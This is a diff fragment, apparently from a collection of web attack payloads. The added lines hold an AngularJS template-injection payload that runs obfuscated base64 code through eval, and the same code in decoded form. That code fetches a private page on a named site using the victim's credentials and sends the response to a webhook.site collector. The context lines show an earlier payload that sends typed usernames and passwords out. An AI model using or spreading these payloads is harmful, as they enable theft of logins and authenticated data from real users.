@@ -35,3 +35,21 @@ mode: 'no-cors',
 body:username.value+':'+this.value
 });">
 ''''
+
+{{constructor.constructor('eval(atob("dmFyIHhodHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CnhodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCkgewppZiAodGhpcy5yZWFkeVN0YXRlID09IDQgJiYgdGhpcy5zdGF0dXMgPT0gMjAwKSAKewp2YXIgYSA9IGJ0b2EodW5lc2NhcGUoZW5jb2RlVVJJQ29tcG9uZW50KHRoaXMucmVzcG9uc2VUZXh0KSkpOwpmZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvN2MyNzA4N2QtYjM2Yy00YzgzLWJhMzgtZTVhNzU3MjM3NjA3JywgewogICAgbWV0aG9kOiAnUE9TVCcsCiAgICBoZWFkZXJzOiB7J0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCd9LAogICAgYm9keTogJ2Zvbz1iYXImYmxhaD0nK2EKfSk7Cn0KfQp4aHR0cC5vcGVuKCJHRVQiLCAiaHR0cHM6Ly9tYW1hbm9ubGluZS53c2ZyZWV6ZS5jby5pbC9wcml2YXRlL0NhcmdvU2VydmljZS9TZXJ2aWNlUmVxdWVzdCIsIHRydWUpOwp4aHR0cC53aXRoQ3JlZGVudGlhbHMgPSB0cnVlOwp4aHR0cC5zZW5kKCk7"))')()}}
+
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) 
+{
+var a = btoa(unescape(encodeURIComponent(this.responseText)));
+fetch('https://webhook.site/7c27087d-b36c-4c83-ba38-e5a757237607', {
+    method: 'POST',
+    headers: {'Content-Type':'application/x-www-form-urlencoded'},
+    body: 'foo=bar&blah='+a
+});
+}
+}
+xhttp.open("GET", "https://mamanonline.wsfreeze.co.il/private/CargoService/ServiceRequest", true);
+xhttp.withCredentials = true;
+xhttp.send();
